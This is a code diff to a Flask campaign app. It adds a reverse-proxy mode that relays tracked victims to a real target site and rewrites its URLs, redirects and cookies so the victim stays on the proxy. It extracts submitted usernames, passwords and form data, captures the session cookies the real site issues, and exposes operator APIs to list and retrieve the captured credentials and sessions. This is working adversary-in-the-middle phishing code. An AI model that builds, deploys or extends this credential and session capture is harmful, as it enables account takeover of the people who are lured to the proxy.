@@ -19,6 +19,7 @@ import queue
 import random
 import time
 import uuid
+from datetime import datetime, timezone
 from functools import wraps
 from typing import Any
 
@@ -56,9 +57,27 @@ from .database import (
     import_recipients,
     record_recipient_click,
     get_recipient_stats,
+    save_credential,
+    list_credentials,
+    get_credential,
+    get_credential_stats,
+    save_captured_session,
+    list_captured_sessions,
+    get_captured_session,
+    invalidate_captured_session,
 )
 from .detection import build_visit_record, evaluate
 from .lures import LURE_REGISTRY, list_templates, render_lure
+from .proxy import (
+    extract_credentials,
+    encrypt_credentials,
+    encrypt_session_data,
+    extract_session_tokens,
+    proxy_request,
+    rewrite_location_header,
+    rewrite_response_urls,
+    rewrite_set_cookie,
+)
 from .redirects import get_redirect_url
 from .storage import log_visit
 from .webhooks import notify
@@ -395,12 +414,130 @@ def create_app(cfg: Config | None = None) -> Flask:
         return _apply_headers(resp, cfg.brand_name)
 
     # ==================================================================
+    # Reverse proxy handler
+    # ==================================================================
+
+    def _handle_proxy(
+        campaign: Campaign,
+        proxy_path: str,
+        recipient: dict[str, Any] | None = None,
+        tracking_token: str | None = None,
+    ) -> Response:
+        from urllib.parse import urlparse
+
+        ip = _extract_ip(request, cfg)
+        ua = request.headers.get("User-Agent", "")
+        sess_id = request.cookies.get("csession", str(uuid.uuid4()))
+        body = request.get_data() if request.method in ("POST", "PUT", "PATCH") else None
+
+        if request.method == "POST" and request.content_type and "form" in request.content_type:
+            form_data = dict(request.form)
+            username, password, has_creds = extract_credentials(form_data)
+            if has_creds:
+                u_enc, p_enc, f_enc = encrypt_credentials(
+                    username, password, form_data, cfg.encryption_key
+                )
+                cred_record = {
+                    "session_id": sess_id,
+                    "campaign_id": campaign.id,
+                    "recipient_id": recipient["id"] if recipient else None,
+                    "tracking_token": tracking_token,
+                    "ip_address": ip,
+                    "username_enc": u_enc,
+                    "password_enc": p_enc,
+                    "raw_form_enc": f_enc,
+                    "target_url": campaign.target_url,
+                    "source_url": request.url,
+                    "user_agent": ua,
+                    "device_id": session.get("device_id"),
+                }
+                cred_id = save_credential(cfg, cred_record)
+                session["last_credential_id"] = cred_id
+
+                if recipient and tracking_token:
+                    record_recipient_click(cfg, tracking_token)
+
+                _broadcast_sse({
+                    "event": "credential_captured",
+                    "ip": ip,
+                    "campaign_id": campaign.id,
+                    "tracking_token": tracking_token,
+                    "recipient_id": recipient["id"] if recipient else None,
+                    "timestamp": datetime.now(timezone.utc).isoformat(),
+                })
+                logger.info(
+                    "credential captured: campaign=%s ip=%s token=%s",
+                    campaign.id, ip, tracking_token,
+                )
+
+        status, resp_headers, resp_body, resp_cookies = proxy_request(
+            method=request.method,
+            path=proxy_path,
+            target_url=campaign.target_url,
+            headers=dict(request.headers),
+            body=body,
+            cookies=dict(request.cookies),
+        )
+
+        proxy_base = request.host_url.rstrip("/")
+        if tracking_token:
+            proxy_base += f"/t/{tracking_token}"
+        else:
+            proxy_base += f"/c/{campaign.id}"
+
+        session_tokens = extract_session_tokens(
+            resp_cookies,
+            [v for k, v in resp_headers.items() if k.lower() == "set-cookie"],
+        )
+        if session_tokens:
+            enc_data = encrypt_session_data(session_tokens, cfg.encryption_key)
+            parsed_target = urlparse(campaign.target_url)
+            sess_record = {
+                "credential_id": session.get("last_credential_id"),
+                "campaign_id": campaign.id,
+                "recipient_id": recipient["id"] if recipient else None,
+                "tracking_token": tracking_token,
+                "ip_address": ip,
+                "session_data_enc": enc_data,
+                "target_domain": parsed_target.netloc,
+                "user_agent": ua,
+                "device_id": session.get("device_id"),
+            }
+            save_captured_session(cfg, sess_record)
+            logger.info(
+                "session captured: campaign=%s ip=%s cookies=%d",
+                campaign.id, ip, len(session_tokens),
+            )
+
+        content_type = resp_headers.get("Content-Type", "")
+        resp_body = rewrite_response_urls(
+            resp_body, campaign.target_url, proxy_base, content_type
+        )
+
+        resp = make_response(resp_body, status)
+
+        proxy_domain = urlparse(request.host_url).netloc.split(":")[0]
+        for k, v in resp_headers.items():
+            lower = k.lower()
+            if lower == "set-cookie":
+                resp.headers.add(k, rewrite_set_cookie(v, proxy_domain))
+            elif lower == "location":
+                resp.headers[k] = rewrite_location_header(
+                    v, campaign.target_url, proxy_base
+                )
+            elif lower not in ("content-length", "transfer-encoding"):
+                resp.headers[k] = v
+
+        resp.set_cookie("csession", sess_id, max_age=cfg.session_max_age)
+        return resp
+
+    # ==================================================================
     # Tracked recipient routes: /t/<token>
     # ==================================================================
 
-    @app.route("/t/<token>")
-    @app.route("/t/<token>/")
-    @app.route("/t/<token>/<path:path>")
+    @app.route("/t/<token>", methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"])
+    @app.route("/t/<token>/", methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"])
+    @app.route("/t/<token>/<path:path>", methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"])
     def tracked_entry(token: str, path: str = ""):  # type: ignore[return]
         recipient = get_recipient_by_token(cfg, token)
         if not recipient:
@@ -412,6 +549,10 @@ def create_app(cfg: Config | None = None) -> Flask:
 
         session["campaign_id"] = campaign.id
         session["tracking_token"] = token
+
+        if campaign.target_url:
+            _process_visit(cfg, campaign, recipient=recipient, tracking_token=token)
+            return _handle_proxy(campaign, f"/{path}", recipient=recipient, tracking_token=token)
 
         js_metrics = session.get("adv_metrics")
         if not js_metrics:
@@ -437,14 +578,18 @@ def create_app(cfg: Config | None = None) -> Flask:
     # Campaign routes: /c/<campaign_id>/...
     # ==================================================================
 
-    @app.route("/c/<campaign_id>/", defaults={"path": ""})
-    @app.route("/c/<campaign_id>/<path:path>")
+    @app.route("/c/<campaign_id>/", defaults={"path": ""}, methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"])
+    @app.route("/c/<campaign_id>/<path:path>", methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"])
     def campaign_entry(campaign_id: str, path: str):  # type: ignore[return]
         campaign = load_campaign(campaign_id, cfg)
         if not campaign or not campaign.active:
             return make_response("Not Found", 404)
 
         session["campaign_id"] = campaign_id
+
+        if campaign.target_url:
+            _process_visit(cfg, campaign)
+            return _handle_proxy(campaign, f"/{path}")
 
         js_metrics = session.get("adv_metrics")
         if not js_metrics:
@@ -500,9 +645,14 @@ def create_app(cfg: Config | None = None) -> Flask:
             flagged_redirect_url=data.get("flagged_redirect_url", ""),
             brand_name=data.get("brand_name", ""),
             description=data.get("description", ""),
+            target_url=data.get("target_url", ""),
             custom_params=data.get("custom_params"),
         )
-        return jsonify({"id": c.id, "name": c.name, "url": f"/c/{c.id}/"}), 201
+        result: dict[str, Any] = {"id": c.id, "name": c.name, "url": f"/c/{c.id}/"}
+        if c.target_url:
+            result["proxy_mode"] = True
+            result["target_url"] = c.target_url
+        return jsonify(result), 201
 
     @app.route("/api/operator/campaigns/<campaign_id>", methods=["GET"])
     @_require_auth(cfg)
@@ -522,7 +672,8 @@ def create_app(cfg: Config | None = None) -> Flask:
             return jsonify({"error": "not found"}), 404
         data = request.json or {}
         for field in ("name", "template", "active", "safe_redirect_url",
-                      "flagged_redirect_url", "brand_name", "description"):
+                      "flagged_redirect_url", "brand_name", "description",
+                      "target_url"):
             if field in data:
                 setattr(c, field, data[field])
         if "custom_params" in data:
@@ -594,6 +745,63 @@ def create_app(cfg: Config | None = None) -> Flask:
         from .database import delete_recipient
         if delete_recipient(cfg, recipient_id):
             return jsonify({"status": "deleted"})
+        return jsonify({"error": "not found"}), 404
+
+    # ==================================================================
+    # Credential capture API
+    # ==================================================================
+
+    @app.route("/api/operator/credentials", methods=["GET"])
+    @_require_auth(cfg)
+    def api_list_credentials():  # type: ignore[return]
+        campaign_id = request.args.get("campaign_id")
+        limit = int(request.args.get("limit", "50"))
+        offset = int(request.args.get("offset", "0"))
+        creds = list_credentials(cfg, campaign_id, limit, offset)
+        return jsonify(creds)
+
+    @app.route("/api/operator/credentials/<int:cred_id>", methods=["GET"])
+    @_require_auth(cfg)
+    def api_get_credential(cred_id: int):  # type: ignore[return]
+        cred = get_credential(cfg, cred_id)
+        if not cred:
+            return jsonify({"error": "not found"}), 404
+        return jsonify(cred)
+
+    @app.route("/api/operator/credentials/stats", methods=["GET"])
+    @_require_auth(cfg)
+    def api_credential_stats():  # type: ignore[return]
+        campaign_id = request.args.get("campaign_id")
+        stats = get_credential_stats(cfg, campaign_id)
+        return jsonify(stats)
+
+    # ==================================================================
+    # Captured session API
+    # ==================================================================
+
+    @app.route("/api/operator/sessions", methods=["GET"])
+    @_require_auth(cfg)
+    def api_list_sessions():  # type: ignore[return]
+        campaign_id = request.args.get("campaign_id")
+        limit = int(request.args.get("limit", "50"))
+        offset = int(request.args.get("offset", "0"))
+        sessions_list = list_captured_sessions(cfg, campaign_id, limit, offset)
+        return jsonify(sessions_list)
+
+    @app.route("/api/operator/sessions/<int:sess_id>", methods=["GET"])
+    @_require_auth(cfg)
+    def api_get_session(sess_id: int):  # type: ignore[return]
+        captured = get_captured_session(cfg, sess_id)
+        if not captured:
+            return jsonify({"error": "not found"}), 404
+        return jsonify(captured)
+
+    @app.route("/api/operator/sessions/<int:sess_id>/invalidate", methods=["POST"])
+    @_require_auth(cfg)
+    @_require_admin(cfg)
+    def api_invalidate_session(sess_id: int):  # type: ignore[return]
+        if invalidate_captured_session(cfg, sess_id):
+            return jsonify({"status": "invalidated"})
         return jsonify({"error": "not found"}), 404
 
     @app.route("/api/operator/templates", methods=["GET"])
